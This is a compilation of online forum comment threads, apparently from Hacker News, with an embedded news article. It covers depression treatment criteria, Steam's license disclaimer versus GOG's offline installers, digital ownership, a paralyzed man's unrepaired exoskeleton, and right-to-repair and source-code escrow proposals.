Unless one can be found, these fuzzy, heavily qualitative descriptions are unlikely to be helpful for future researchers. reply jtrn 1 hour agorootparentIt's counterintuitive to me that a more specific concept/subgroup of a phenomenon would be less useful than a larger catch-all category. Is the self-rated questionnaire depression scale used in this study a good \"rigorously operationalized concept\"? We are successfully treating people with this exact kind of indication/operationalization with real success already. For instance, the indication criteria for ECT basically follow the \"burnout profile\" I described above, with the addition of \"treatment resistant to therapy and medication,\" and it has shown by far the best effectiveness for that kind of depression. I completely disagree that it's not possible to operationalize the concepts above, for instance with standard BDI or MADRS, supplemented with a ratio with a cutoff to indicate a large fall in everyday functioning. Like an extremely large fall in Global Functioning Scale (GAF) localized to a distinct and pattern-breaking period in a person's life. If you think that these concepts are fuzzy and qualitative, I really hope you have even greater criticism towards this study, not to speak of concepts like anxiety, trauma, and ADHD, which are completely off the rails when it comes to diffuseness and subjectivity. But even if you are right, that burnout-depression and existential anxiety are not possible to study because of their vagueness, it still would not make this study helpful as it's presented. Or am I mistaken? Do you think it's a good and helpful study, whose implications I should fight for in our clinic? And would I see a marked improvement in our patients, compared to SSRIs for the \"Depression\" group? I am willing to admit I am wrong.

Here’s how it works. (Image credit: Ubisoft) A subtle change has arrived to the Steam shopping experience to drive home the fact that you're buying a game license rather than a copy of a game that you'll definitely own forever, and rival storefront GOG already seems to be weighing in on the matter. As reported by Engadget, if you're about to buy a new game on Steam, you'll now notice a new message pop up, which reads: \"A purchase of a digital product grants a license for the product on Steam.\" This disclaimer appears as though it's likely related to a California law set to come into effect next year, which'll stop digital storefronts from using words like \"buy\" in relation to things like game licenses unless it's obvious what people are spending their money on, as part of a move to make it clearer to consumers what they actually own (or rather, what they don't). Needless to say, this new message on Steam has already caused quite a stir, so much so that it's seemingly reached the ears of rival storefront GOG. GOG is famously free of digital rights management (DRM), and offers its customers offline installers for the games it sells which you can download onto your PC where they can remain safe forever, so it's understandable that the site might have some thoughts on all this. \"Since checkout banners are trending, we're thinking of putting one up ourselves,\" a tweet posted on the official GOG Twitter account reads. \"Thoughts on this one?\" The concept banner in question says: \"A purchase of a digital product on GOG grants you its Offline Installers, which cannot be taken away from you.\" As was pointed out as recently as September when GOG weighed in on the upcoming California law, however, it's worth noting that GOG does, in fact, sell licenses to games much like other storefronts. With that said, it clarified at the time: \"When we said we let you 'own' your games, we meant that no matter what happens – whether it's licensing issues, storefronts shutting down, or even a zombie apocalypse cutting off your Internet – you'll still be able to play them thanks to our offline installers. We want to ensure your gaming legacy is always in your hands, not ours.\" With that in mind, there's no doubt many would argue that it's a better deal than what Steam offers.

I've switched to retro gaming and find I enjoy it more. For example, exploring 90s Japanese games that never saw wide release in the US. Recently I've found some real winners exploring the X360 and PS3 back catalog of indie games via emulation. I'd never seen many of these because they were only released on their respective online services.

You can't take a GOG licensed game and sell copies or make a derivative work so you don't own it Isn't this not the usual way we talk about ownership? If I buy a book at the bookstore, I own the book. I can put the physical object on my bookshelf. If someone breaks into my house and takes the book, they have stolen the book from me. I have the right to give or resell the book to someone else. I have the right to read it when and how I want to. I have the right to bequeath it when I die. That's \"ownership\" for all intents and purposes, even if the rights to do certain things with the book are reserved to someone else. I can't, for instance, place the book on a photocopier, press the copy button for each page, and give the copies to someone else. I can't read from it into a microphone at a public event. I don't see how ownership in the digital realm is so different. I don't have a physical artifact, and copies of a digital work are exactly identical, rather than distinguishable. But that doesn't change very much about what ownership ought to mean. It basically means that I'm not limited in my rights to use the (digital) book however I'd like for private use, although certain things I might want to do with the work are illegal. I can't make a copy and give it to someone else. The fact that copying is \"easier\" doesn't change the fundamental nature of that restriction. When Steam got in hot water recently for saying that you couldn't give your account to someone else (e.g. through a will), I think the reason people were mad about that because it meant that having a game in your Steam account is definitively not owning the game.

GOG Galaxy has been experimental until recently and it is more concerned with being a unified gaming client rather than the primary way to distribute GOG games. In the last couple of years it has actually become quite unstable anyway and it is barely being maintained, clearly not a focus, Linux or not. “Forcing its users to be at the whim of Microsoft” is quite a stretch. reply joveian 14 hours agorootparentIt isn't a zip file (that is Itch) but an installer (you can't easily install it just as a non-admin user on Windows, although on Linux it does install under the current user). They had a .tar.gz for Linux at first but now use a self-extracting installer there as well. A few years ago they said (didn't save the link) that only something like 5% of customers just use the offline installers (and I'm fairly sure not all that many more ever downloaded them, although it might be higher now after a few update issues in Galaxy). It is unfortunately not uncommon for games released on GOG to not have Linux versions available elsewhere. CDPR games have had Galaxy-exclusive bonus items, which is hardly being friendly to offline installers. I don't have any inside knowledge but there is clearly an internal battle at CD Projekt (and their investors since they are a public company) between those who want to print money doing the unethical stuff that other game developers and stores do and those who want a more customer friendly approach. They tried a more ethical online focused thing with GWENT (that ended up partly under GOG due to relying on Galaxy and was a big reason they pushed for higher Galaxy use for a while) but it ended up not really making much money. Things like this California law are great to help support the availability of DRM-free games. Also, GOG has around 6500 games now and I'd be supprised if they were involved in getting more than about 100 of them to work on modern systems. Galaxy has been around over half the time GOG has been in business (as an online store, not counting the early CD Projekt days). You are thinking of the early days of GOG but they are quite a bit larger now and CD Projekt as a whole is much larger now. I still think they are the best option to support DRM-free games but they are not the same as when they started (not only in bad ways, the refund policy is great now). reply oersted 9 hours agorootparentThank you for that context, I clearly had a somewhat outdated view, this is interesting. reply OWMYT 22 hours agorootparentprevI might have exaggerated a bit. I haven't really tested GOG out much because it doesn't do those things like having a Linux client I expect a consumer-centric platform to do and it caved in to the Chinese government just like everyone else. But if the idea is that other platforms might screw you over some time down the line and this platform will have your back, I am not convinced if they entirely dismiss Linux. I know it is not practical for CDPR to develop Proton like Valve. The bare minimum they can do though is to show they have contingency plans in case Valve stops upstreaming its translation layer. Otherwise, why not stick to the platform that is too big to fail and is actually doing something useful? reply oersted 21 hours agorootparentIf the concern is CDPR’s character, I believe their first-party games are known to be remarkably Linux friendly. CP2077 actually run best in Stadia at launch, which I believe was Linux based. Also consider the fact that a large fraction of GOG games are painstakingly restored old games, where revenue is clearly an afterthought, they sometimes seem like a nonprofit. You can’t reasonably expect them to also add Linux support to games from an era where Linux gaming was practically nonexistent, modern Linux translation layers will most likely be completely incompatible. And again, they have not had a client for most of their tenure, and I cannot think of anything more consumer-friendly or consistent with Linux ideology than literally letting you download the files and do what you want with them without any DRM. reply OWMYT 21 hours agorootparentThat is a good point. I might have been holding them to too high a standard. I don't really take into account benefits like DRM-free properly either. reply philistine 17 hours agorootparentFor 95% of what GOG has on its shelves Wine is the only way, outside of rewriting them from scratch, to get those games on Linux anyway. reply hiccuphippo 22 hours agoparentprevYou can use the heroic game launcher instead of gog galaxy: https://heroicgameslauncher.com/ And you can just download the games from their website, they don't force you to use gog galaxy. reply OWMYT 21 hours agorootparentI am just a bit concerned about their attitude.

On GoG's part, they do provide the ability to just download a game with a web browser (the old-fashioned, DRM-free way). From there, I can manage the games I that own in any way that I choose.

Nothing wrong with copyright, I think copyright is a very important legal structure recognizing the effort to create something. but I also think it somewhat enlightened to say after a given amount of time the public owns this. Or the way the US government says \"works created by the US government are for the good of all US citizens and as such are in the public domain\". should a person be allowed to say \"I made this for the public good and release any claim of ownership over it\". sqlite infamously has trouble because some countries are legally unable to recognize a work put in the public domain.

But printed works, It is easy to get a perfect copy, and computers are even worse. Trying to make a computer not copy something is like trying to make water that is not wet. This is the domain that copyright law started to appear. Basically laws explicitly saying you own what you wrote and get rights about decisions on when and where it can be copied. But the point of my rather long-winded and incoherent rant is to say they can and do sell copies. when you buy a work those bits belong to you. you can do whatever you want with them... well, almost whatever you want with them.

With a bit of luck, this story will get wide enough distribution that GOG will gain a bit of market share. Sadly, if GOG gains enough new market share to have a material effect on Valve's bottom line, I imagine Valve's initial response will be a \"most favored nation\" clause in future publisher contracts allowing Steam to introduce offline, DRM-free installers for the subset of Steam games also available on GOG, diluting GOG's unique value proposition with a move that will nevertheless be hailed as a victory for consumers. reply t0bia_s 14 hours agoprev\"If buying isn't owning, piracy isn't stealing\" https://pluralistic.net/2023/12/08/playstationed/ Also, Steam should not offer buying games.

Such people are taken by surprise when it turns out companies can take away your “bought” content simply by virtue of changing licensing agreements or corporate structure without public input. Some recent cases: • Crunchyroll and Funimation merged. People who had “permanent” digital copies purchased from Funimation lost them. • Sony’s license for Discovery Channel content was not renewed, so all Discovery videos people had purchased (most notably, 20 seasons of Mythbusters) were removed from customers’ libraries. • Ubisoft shut down the servers for The Crew and removed it from purchasers’ Steam libraries, despite the presence of a 20‐hour single‐player campaign that was online only for no good reason. Maybe people will get used to this and consider all purchases ephemeral. I hope not.

    "originBody": "Michael Straight walks using his exoskeleton at Gulfstream Park racetrack in Hallandale Beach, Fla. (Lauren King/Coglianese Photos) By Jonathan Edwards October 8, 2024 at 10:49 a.m. EDT An exoskeleton gave Michael Straight the ability to walk again after a horse racing accident left him a paraplegic. Over the course of 10 years, Straight walked more than a half-million steps while paralyzed, helping to pioneer a field. But in June, his machine stopped working, and the manufacturer refused to repair it. For the first time in a decade, Straight couldn’t walk. “It was like being paralyzed all over again,” he said. Straight, 38, said he spent three months pleading with exoskeleton manufacturer Lifeward, which last year changed its name from ReWalk Robotics, to replace a tiny component that connected the battery to a watch that controls his exoskeleton. Repeatedly, company employees told him they were no longer doing maintenance on machines more than five years old and then connected him with phone lines where he left voicemail messages that were never returned. Advertisement Story continues below advertisement Calling Straight “a real pioneer,” Lifeward CEO Larry Jasinski apologized Friday for the company’s response to the maintenance requests. He said that the company is no longer repairing exoskeletons older than five years because the Food and Drug Administration, which regulates the devices, has approved their usage for that timespan. 🧘 Follow Health & wellness Follow But, he added, when he realized that repairing Straight’s exoskeleton was minor and would not have a material impact on the machine’s structure, he overnighted him a replacement watch. “We didn’t do this one perfectly, and I’m sorry for that,” Jasinski said. Straight’s path to paralysis started in the 1990s at the Saratoga Race Course, one of the most famous thoroughbred horse racetracks in the country. His grandparents took Straight and his twin brother to the track in Saratoga Springs, N.Y., for the first time when they were about 7 years old, the start of a childhood surrounded by horse racing. The boys were obsessed with becoming jockeys. Advertisement Story continues below advertisement “We were around it our whole life, so it’s definitely something we always dreamed about doing,” he said. In the mid-2000s, Straight and his brother got a chance when they were accepted to the inaugural class of the North American Racing Academy, the first-ever jockey school in the United States. In March 2009, Straight parlayed that training into instant success, riding to a long-shot victory at Tampa Bay Downs in his first race. Then, on Aug. 26, 2009, he was riding I’m No Gentleman at Arlington Park in the Chicago suburbs when tragedy struck. Because of a brain injury, Straight can’t remember anything about the race that paralyzed him. But video shows that Straight’s horse’s front hoofs clipped the back legs of the mount in front of them. The two crashed to the track heads-first. Story continues below advertisement The accident broke the horse’s neck, forcing authorities to euthanize it. For Straight, the fall caused bleeding on the brain and broke two vertebrae in his upper spine, paralyzing him from the chest down. Advertisement Recovery was slow. He says he remembers nothing about the weeks after his accident. But he spent seven weeks in the hospital, which included multiple surgeries. During inpatient rehabilitation, staff had him recite the alphabet and count out numbers to test the severity of his brain injury. They prodded him to build letters into words and words into sentences. At one point, they strapped him to a bed and lifted it so that Straight was in a vertical position. After a minute, he felt lightheaded and dizzy. Story continues below advertisement “That was the first time I was like, ‘Wow, this is going to be a long, long road to recovery.’” But even though he knew it would be hard, Straight said he wanted walking to be part of that road. He asked the first doctor he met at rehab about the chances of walking again. The doctor told him he would be honest with him: 2 percent. As the doctor left, Straight turned to his mom and dad and said, “Two?” Then he turned toward the departing doctor’s back and held up his middle fingers. “I’ll show him 2 percent,” he remembered saying. Straight had settled into paralyzed life by 2012 when he was watching a TV show in which a character used a suit to stand and walk. At first, Straight dismissed it as the fictional embellishment of TV writers. But when he followed up with some research, he discovered there were organizations in the nascent stages. One of them was the University of Miami’s Project to Cure Paralysis, which was working with ReWalk Robotics’s exoskeleton. Advertisement Story continues below advertisement Straight was instantly sold. “I wanted it so bad,” he said. The horse-racing community helped raise the money for the exoskeleton and, in 2014, he moved from Kentucky to South Florida so he could work with the Miami Project to Cure Paralysis. That summer, he was strapped into the exoskeleton for the first time and took his first post-paralysis steps. He was hooked. But it was one small step in what turned out to be a marathon. Straight spent the next several months working through a checklist of actions he needed to get clearance to use the device at home. They included tests of balance and strength, tasks he repeatedly failed, leading him to get stronger and more skilled. Story continues below advertisement Finally, in November 2015, he took his exoskeleton home. For nearly a decade, he has used the exoskeleton two to three times a week, doing about a 1,000 steps per session. Over that time, he has logged more than a half-million steps. Walking in the exoskeleton has provided him with workouts and physical therapy. It helps regulate his bowel and bladder functions and stops his legs from spasming, a common ailment of paraplegics. Advertisement “It’s been a game changer,” he said. Then, in June, the watch he uses to control the machine stopped working, making it useless. At first, Straight figured it would be an easy fix. He’d had problems with the machine before, ones that were easily solved by ReWalk through over-the-phone instructions or an in-person visit from a technician. This time, however, ReWalk’s employees said they wouldn’t fix the exoskeleton because they were no longer working on machines older than five years. Story continues below advertisement Straight resorted to Plan B — fixing it himself. But, he told his contact at ReWalk, he just needed him to tell him where he could find the parts. The contact told him to search the internet. Straight went online and discovered the battery he needed. But he couldn’t find the piece that connected the battery to the watch. Advertisement Straight said he called ReWalk five times in total and left messages four of those times. He said he called from his wife’s phone another three or four times after that. He never got a response. So he contacted local TV station WTLV, which published an article about Straight’s struggles. Lifeward responded quickly after that. Jasinski said that even though Straight’s exoskeleton is working again, he encouraged him to buy one of Lifeward’s newer models. Patients no longer have to foot the entire bill like they did when Straight got his machine, he noted. Earlier this year, Medicare said it would start paying for 80 percent of exoskeletons, which at Lifeward cost about $100,000. Story continues below advertisement And although that coverage doesn’t extend to paraplegics who have injuries to their spine as high up as Straight, Jasinski said that, given his track record of walking in the exoskeleton, he’s confident Medicare would approve Lifeward’s claim. Advertisement “We would take that battle forward,” Jasinski said. Straight said that his recent experience has left him wary of Lifeward and more prone to look to another company if he decides to buy another device. For now, he said, he’s happy with the machine that’s let him walk a half-million steps more than doctors ever thought he would. “I’m a paralyzed guy who stands every day, stands or walks every day,” he said. “That’s how I want to put my foot forward.” Share Comments Sign up",

In the event of a bankruptcy proceeding, all source code for a hardware product shall be open-sourced. 2. In the event of a hardware product that is dependent upon cloud services being discontinued, instructions for \"rooting\" the product, and the firmware source code shall be open-sourced. 3. Companies that acquire the rights to patents of bankrupt companies and discontinued products must keep the cloud servers going or open-source blah blah. The only serious counter argument I can think of here is the tangle of patents, to which I retort, the price of keeping the patents is keeping the furnaces powering the cloud servers running. Am I crazy here? reply bruce511 15 hours agoparent>> In the event of a bankruptcy proceeding, all source code for a hardware product shall be open-sourced. I'm guessing you've never run a company into bankruptcy (which I take as a good thing.) Bankruptcy is when liabilities exceed assets and cash doesn't exist. At that point the assets are sold to raise money to give pennies on the dollar to creditors. The assets are not \"binned\", they are sold. That includes intangible assets like domains, source code, hardware schematics, and so on. What you are proposing is akin to suggesting \"any buildings should become public domain\" or \"any cars they own should go to a local charity\". In essence you are taking one asset class and dictating how that class is disposed of. Why that class? Why not all of them? Thirdly (I thought of another reason) it's trivial to simply store this class of asset in a separate structure, that has no liabilities and hence can't be bankrupt. It becomes simply a different asset class. (Separating assets from liabilities is a common business practice - even if a company \"owns\" their office, it's typically a different company.) I don't think you're crazy, it's a good area to explore, but it's not practical to implement this in the business landscape we currently exist in. reply dustyventure 10 hours agorootparent> What you are proposing is akin to suggesting \"any buildings should become public domain\" or \"any cars they own should go to a local charity\". I don't think this is accurate. I think they are proposing priority for the consumer in the hierarchy of creditors that is a little more specific about assets than the usual hierarchy. All IP and licensing rights to IP could become specially encumbered during bankruptcy to enable a consumer priority on it, etc. I don't think it would be more difficult than some of the existing setup, but naturally much of the existing setup is more in theory than in practice. reply ehnto 14 hours agorootparentprevThe \"simple\" answer is to handle these issues long before bankruptcy, with right to repair laws. It is not actually simple of course. I don't think it would be unreasonable to mandate software for hardware products be pluggable in such a way that you can modify the runtime with hooks. During the commercial, supported life of the product the consumer doesn't know any different. But at EOL, repair shops can make a market for \"modules\" that can do things like change the remote server a IoT device talks to. Removes requirements for DRM, fixes bugs etc. Threat to commercial interests is really low here in my view, an average consumer pays for a product and pays for the SaaS portion because its convenient and provides value. Then the product reaches EOL and the aftermarket takes over. No different to say the long, exhaustive use of used cars (at least in the decades prior to digital integration in cars, it remains to be seen how the next two decades go re:software services ridden cars.) reply bruce511 14 hours agorootparentI'm 100% behind right to repair. But repairing hardware can be tricky (we've made hardware where the CPU got discontinued) - and of course repairing parts that contain firmware us another layer of hard. As you point out mixing software and hardware (aka firmware) makes repair more-or-less impossible. reply nobodyandproud 3 hours agorootparentThat’s the manufacturer’s problem to solve. It’s quite achievable. reply exe34 13 hours agorootparentprevthat's what documentation is for - give us the specs so that somebody somewhere can figure out how to replace it. reply mlyle 13 hours agorootparentprev> I don't think you're crazy, it's a good area to explore, but it's not practical to implement this in the business landscape we currently exist in. It's relatively straightforward. You put the code or whatever else your customers need into escrow with a third party. The code gets released if you discontinue the product or it otherwise leaves the market. You then market that you're doing this, so that everyone A) knows they can pursue getting access to the escrowed stuff, B) it's a selling point to remove some of the vendor risk, and C) it's not just a capricious action to undermine creditor rights. Of course, it may be harder to borrow money if you do this. And customers are generally not savvy enough to require this (though if you do a large enterprise deal, requiring code escrow is not an unknown term). reply slowmovintarget 12 hours agorootparentPutting code in escrow is usually done as part of the contract between the business and the customer, and the code is in escrow for that customer not for everyone. reply mlyle 11 hours agorootparentSure-- the point is the escrow infrastructure already exists. And it's been used the exact way I describe. See e.g. https://en.wikipedia.org/wiki/Source_code_escrow#Software_op... reply bigiain 11 hours agorootparentprevThe article talks about Medicare subsidising 80% of the purchase price for many customers. That'd be a fairly effective place to negotiate such an escrow contract. reply bruce511 13 hours agorootparentprevAs an option between developers and customers, of course you can do this now, and it happens. That's very different though to a law that requires source to be released. The former is something you do because you believe it gives you the edge in a sale. The latter is a regulatory framework that imposes problems on everyone unilaterally. reply scratcheee 11 hours agorootparentOnly everyone who goes bankrupt, and their creditors. Rather the opposite for their customers. I’m sure there’s a few cases where this would excessively hurt a company’s prospects (perhaps where a company has an innovative software product with a thin hardware component), but in the majority of cases losing access to the software of a hardware product as an asset is a relatively small loss, and the benefit to consumers is pretty huge. I’d support the trade off. reply throwup238 14 hours agorootparentprevWhat would be the problem with making it a stipulation of the acquisition as a consumer protection law, regardless of the corporate structure? Either it goes to a buyer willing to take on the liability and continue operating it or wind it down cleanly in exchange for the IP (and bidders can price that liability in), or it goes to a government agency or NGO capable of open sourcing or extending its life. I don’t know enough about how courts split up intangible assets like IP to suggest how to bundle it with this proposed liability, but I think it can be pushed up to insurance carriers like warranties are. Make the insurers liable so that they push the requirements downstream and make them first in line for the relevant IP as creditors. Allow them to argue in front of the bankruptcy court to define what bundle they are entitled to as creditors and them allow them to fire sale that bundle as part of the rest. If they can’t get enough to cover their calculations, they can dump it on the agency/NGO for free. (IANAL and I dont know what I’m talking about) reply bruce511 14 hours agorootparentDefine \"continue operating it\". Let's say I buy a text editor from a bankrupt company. I take that code and incorporate it into my main product. You can buy the text editor separately, it just costs 20k (same as my main product.) Is that \"operating it?\" Alternatively this asset is encumbered by these rules so no-one wants it, it gets Open Sourced. Creditors lose out on potential revenue to recover their losses. Now let's assume the code base is 'large'. Maybe it contains licensed 3rd party code (shipped as source) maybe not. Someone has to check. Who's owning that someone to do the check? If the check misses code, and proprietary Google code gets released. Who will Google sue? (Hint: everyone) The suggestion is flawed because it fundamentally changes the way assets are handled in bankruptcy. Or declares code not to be an asset (which in turn has unwelcome side effects.) reply throwup238 14 hours agorootparent> Let's say I buy a text editor from a bankrupt company. I take that code and incorporate it into my main product. You can buy the text editor separately, it just costs 20k (same as my main product.) Is that \"operating it?\" No, that’s operating a different product from the one customers of the bankrupt entity paid for. “Operating it” would mean stuff like decoupling the text editor from any service required to run it - like an extension server - by making just enough code open source to allow other users to run their own extension registries and updating the text editor binaries to allow setting custom endpoints. The acquirer can keep the rest of the code closed sourced and integrate it into their own products all they want. They can even stop updating the editor all together after they’re done fulfilling the requirements. The courts can decide where reasonableness ends with consumers in mind. Honestly this seems like an intentionally obtuse example in a thread about a medical hardware product. > Alternatively this asset is encumbered by these rules so no-one wants it, it gets Open Sourced. Creditors lose out on potential revenue to recover their losses. Creditors lose out to higher priority creditors all the time. The #1 creditor should be the consumers who bought the products and have no protection otherwise (or maybe second only to unpaid employees). > Now let's assume the code base is 'large'.

That’s not new or radical (and even Windows is source available to the right customers). Licenses only extend far enough to allow the existing consumers to operate their devices. Besides, how would anyone acquire the IP without the components it licenses? > The suggestion is flawed because it fundamentally changes the way assets are handled in bankruptcy.

This is how it should have been all along. It's the fundamental point of the free software movement. It's also how it was in the beginning, before companies like Microsoft realised they could use law and technical means to sell knowledge as a product. I hope one day we can go back to this and look back at this funny time when people made us think knowledge was a product. reply m463 13 hours agoparentprevI think what you really want is: - create a medical product - apply for FDA approval and put code in escrow - get approval In case of bankruptcy or other types of failure to maintain product, release code from escrow. Although I wonder what would happen in this scheme if you use someone else's IP while creating a product, or parts of your stack are also obsolete. with respect to similar sorts of things, I think the library of congress used to get copies of copyrighted works. And patents have enough drawings and descriptions to (re)create what is being patented. reply numpad0 12 hours agorootparent^ this sounds like a long-term good plan to me. Submit all code to qualify, or not. That should be the standard for all authority-approved things globally. reply notjulianjaynes 11 hours agorootparentprevThere already exists some limitations from the FDA regarding software. For example if you receive clearance (NB this is different than approval) for a device which uses AI, it cannot modify its own source code and any changes need to go through the clearance process again. (Or something like that it's been a while since I looked this up.) I don't know that this is how things are currently structured, but if a company was required to submit a device's source code as a condition of receiving a 510(k) clearance perhaps there should also be a condition that the FDA can release this code in instances where the public interest in doing so would outweigh the IP interests of some piece of abandonware. Yeah who am I kidding that won't happen. reply krisoft 8 hours agoparentprevWhat are we talking about here? The exoskeleton maker didn’t go into bankruptcy. The exoskeleton is not dependent on cloud services (or at least it is not reported that they would have gone away) and no company acquired anyone. You are proposing extensive changes, with undeniably serious chance of side effects and your proposal doesn’t even address the issue from the article. reply nfrmn 8 hours agorootparentExactly. The problem here is that the company has set a policy not to support $100,000 medical equipment after 5 years. Mind boggling - imagine if an aircraft manufacturer said the same thing. Using aircraft as an example, they are still in service after 50 years and parts still available for many of them. A similar approach should be taken to equipment like this exoskeleton reply dangrossman 16 hours agoparentprevFew companies write 100% of the software that runs on their hardware. If some insulin pump uses proprietary firmware licensed from Johnson & Johnson for some part of its operation, does Johnson & Johnson lose its entire firmware licensing business as soon as one customer goes bankrupt? Or are they forced to become a B2C company and manage and sell licenses to millions of people it had no relationship with before? Is it weaponizable: pick a competitor, get them to license some software to a shell company of yours that makes a token device with it, fold the shell company, and now the competitor is required to give away their firmware to the public (and you)? reply zulban 15 hours agorootparentHave you completely misunderstood the concept here? This isn't some IP virus that infects anyone that touches it. J&J keeps the IP that it owns, in all cases, obviously. The bankrupt company must release the IP that the bankrupt company owns, unless someone like J&J wants to acquire it and keep things running. Obviously a company that fails wouldn't destroy the IP of another company. Obviously the failed company only impacts the failed company IP. I think you may be trying too hard to find flaws in this idea, instead of trying to make it work. reply dangrossman 15 hours agorootparentMaybe I have? Could you explain your understanding of it? If it doesn't extend past the software the hardware vendor directly wrote, then it doesn't result in hardware owners being able to continue running the hardware after the manufacturer goes bankrupt, which was the purpose of the proposed \"fantasy law\". reply Sankozi 11 hours agorootparentIf closed source solution of bankrupt company used closed source solution of a non-bankrupt company then you just need a new licence. If non-bankrupt company is not issuing new licences then it is not supporting its software -> it needs to open source it. You can apply this rule recursively. The only problem I see is the licence cost (or should it cost anything for existing licence owners of bankrupt company). reply z3phyr 14 hours agorootparentprevMaybe allow others to replace the firmware with their own? reply HeralFacker 16 hours agorootparentprevExactly. Proprietary software and software patents need to end. In the case of medical devices, such restrictions violate the ADA by blocking access to reasonable accomodations. reply bruce511 15 hours agorootparent>> Proprietary software and software patents need to end. I'm with you on software patents. On copyright (from which proprietary software is derived) I'm less convinced. My argument is two-fold; Firstly, copyright law is the only thing that allows Open Source and Free Software to exist. Copyright is the mechanism that grants an author control of their work, and is the mechanism that forces people building on OSS/Free Software to release code. You talk about \"ending proprietary software\", which in turn means effectively removing copyright, since it removes the authors control over their source code. Secondly, and from a completely different direction, killing proprietary software basically kills all the software people use. Sure OSS is great at infrastructure. But it has performed poorly in becoming the software people care about. Without proprietary software there's no Chrome, Google Search, Gmail, YouTube, Facebook, Netflix, MS office, Dropbox, AWS, et al. In infrastructure there's no iOS, Windows, Macs, Google services (aka Android as we know it) etc. To argue that OSS has clones or replacements of this stuff is o miss the point that proprietary software created these products and markets. And for all the clones that may be out there most haveI mean, I guess it does make me curious how you should go about regulating a device like this. That's actually my point. There's an interesting policy discussion to be had here, and instead of starting it, they just decided to smear a company. > Like, if the metal fails and you have a horrible fall and break your hip and shoulder, that's pretty different from an iPhone that won't turn on. > If this is only approved for 5 years, shouldn't the guy be replacing it rather than repairing it? And shouldn't health insurance be covering that, at least beyond the deductible or whatever?

Maybe that’s the issue that needs repairing first. reply akira2501 20 hours agorootparentIt doesn't sound like a hard and fast rule. It seems like it's whatever the manufacturer asks for in terms of \"intended working life.\" This _seems_ to be the original FDA certification for the device: https://www.accessdata.fda.gov/cdrh_docs/reviews/den130034.p... The problem here, of course, is it's not the device itself, but the simple remote control peripheral that is designed to switch device operating modes. The FDA should force manufacturers of \"two piece\" systems like this to have backup controls on the device itself and to exclude these non-medical components designed for control from any regulation covering \"intended design life.\" It seems like a daffy middle ground that the FDA lets exist and manufacturers take advantage of when they can. reply generalizations 19 hours agorootparent> It seems like it's whatever the manufacturer asks for in terms of \"intended working life.\" I would guess the FDA makes their certification easier or harder to pass based on how long the device is expected to last. If the 5 year lifespan is what hits the middle ground for that company between cost-of-certification and useful-product-life, then it's up to the FDA to make a longer lifespan feasible to get certified. reply MichaelZuo 19 hours agorootparentprevThere is no part two to the certification?

Because in the article it says that he was going to fix it himself but couldn't find the part that connects the battery to his controller watch. reply cptaj 21 hours agorootparentNot sure about the US but in some countries this is regulated for cars. Companies are required to provide parts for a certain amount of years after discontinuation of the product. It seems abundantly reasonable that a similar requirement be imposed for prosthesis.

For cases where there really is no way around using custom hardware, at end of life the specifications should be made public so that a third party can manufacture them. In this specific case, the real issue is just the incredibly short service lifetime. While different medical devices are going to have different lifetimes, manufacturers need to continue to provide support for at least 36 months after reporting that they plan to discontinue support, which is 60% of the lifetime of this product. Typically medical devices are supported for much longer. reply bastawhiz 18 hours agorootparentTo play devil's advocate: > They shouldn't be making such unnecessary proprietary components. Perhaps not, but that's not right to repair. Pretty much everything in any modern smartphone is completely proprietary. And as the article said, the battery wasn't proprietary. The missing part was the battery connector. That doesn't even suggest to me that it's wildly proprietary, just that it can't be found anymore. Lots of components that are easily sourced now would be challenging for an ordinary person to source in a decade. > at end of life the specifications should be made public so that a third party can manufacture them. This also isn't right to repair. In fact, it probably doesn't help much at all: a sufficiently specialized part on a specialized medical device is going to be so niche that the cost of an aftermarket part will be huge. There's probably what, twenty of these things in the wild? A hundred? How many aftermarket manufacturers will even pick up the phone for a one-off custom part, spec or no? > manufacturers need to continue to provide support for at least 36 months after reporting that they plan to discontinue support, which is 60% of the lifetime of this product The device was supported for the regulatory limit of five years, and the owner has been using it for ten. Assuming they did give three years of support after discontinuing the product, it's now two years beyond that. For a product only approved to be sold for five years by a regulator, I think the fact that the only piece that couldn't be serviced after double that time is a battery connector is pretty impressive (all things considered). Customer service aside, I'm not sure how much more you could possibly ask from this company. reply justinclift 17 hours agorootparent> How many aftermarket manufacturers will even pick up the phone for a one-off custom part, spec or no? That would depend entirely upon the part. With (detailed) specs being available, quite a lot of skilled repair techs would be able to bodge something competent together (!) to meet those specs. Re-manufacturing completely 100% good parts could be a thing sure, for sufficient volumes. But real world situations for low volumes tend to be \"lets get it working well enough using the tools we have available\". Creativity is required. ;) The results for those situations are improved dramatically if there's detailed, good quality docs easily accessible to the people working on it. reply Dylan16807 16 hours agorootparentprev> How many aftermarket manufacturers will even pick up the phone for a one-off custom part, spec or no? If you offered 1% of the entire device's replacement price, for a part that the average tinkerer could build, I think you'd find a stampede of competent offers. I'm sure much lower amounts would work too. reply tedunangst 20 hours agorootparentprevIsn't five years longer than 36 months? reply jjk166 20 hours agorootparent36 months is 60% of five years. reply squarefoot 19 hours agoparentprev> And this is why right to repair laws are a thing.

Right to repair, in a broad sense, also covers access to parts. This is definitely an edge case and we might want to just consider that if we're going to do experiments on disabled with the aim of helping them, and they want to continue using the tools, we might have to subsidize access to the parts until they die. reply mattmaroon 20 hours agorootparentI don’t think it’s an edge case at all. Right to repair doesn’t require a manufacturer to continue making parts or spend their own money on creating a large inventory of them. It’s one thing to require Apple to sell you a phone screen they are still making, it’s another to require them to be able to sell any number of them at any time from ones they do not. Right to repair is a negative right. There’s no reason to turn it into a positive one. reply the_gorilla 20 hours agorootparentIt's an edge case because the supply is so small and the hardware is so specialized. If this were an iPhone screen there's be a dozen companies in china capable of producing and selling them near cost if apple didn't interfere, and we'd have plenty of people willing to repair and resell the screens if apple would stop abusing US customs to seize repaired screens as they've done in the past. reply mattmaroon 17 hours agorootparentI mean this particular one may be an edge case but you probably just described half the products people would want to repair. And the real meat of the comment is the part about forcing companies to make and sell things. reply the_gorilla 17 hours agorootparentI agree with that, and it's possible that half of what people buy and want to repair aren't going to be repairable under market conditions. Probably more; most of these cases it's just economically infeasible to repair anything that isn't new or produced recently, with supply lines still active, and it's fine when nobody wants to pay for it. So for my definition, what makes this an edge case is specifically it's expensive medical equipment that a disabled user can't pay to acquire a part for, and companies aren't willing to produce anyway because it's so niche. 99% of equipment probably falls under \"I want to repair it and someone (myself or a repair company) wants to fix it\" or \"I don't want to repair it because it's so expensive\". The rest would be the edge case where you want to repair it and you literally can't afford to - even if you could produce the parts. By the way, I hate this article, I just want the information and not have to parse an entire goddamn magazine to get to it. reply mattmaroon 16 hours agorootparentYeah it is overly-literary. Writers sometimes just like to put words in things. reply MichaelZuo 19 hours agorootparentprevThe point still stands, no 